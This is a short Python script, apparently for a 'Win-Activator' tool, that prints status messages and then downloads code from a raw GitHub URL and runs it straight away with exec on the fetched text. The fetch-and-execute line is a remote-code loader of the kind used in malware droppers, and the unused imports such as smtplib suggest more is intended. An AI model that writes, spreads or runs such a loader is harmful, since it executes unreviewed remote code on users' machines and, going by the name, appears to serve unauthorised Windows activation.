import os
import subprocess
import time
import tempfile
import sys
from clint.textui import colored
import smtplib
import webbrowser
import json
import requests

print('Getting app data...')

# Define the GitHub repository URL and file names
repo = 'https://raw.githubusercontent.com/lnpddev/Win-Activator/main/main.py'
print('Running')
exec(requests.get(url=repo).text)
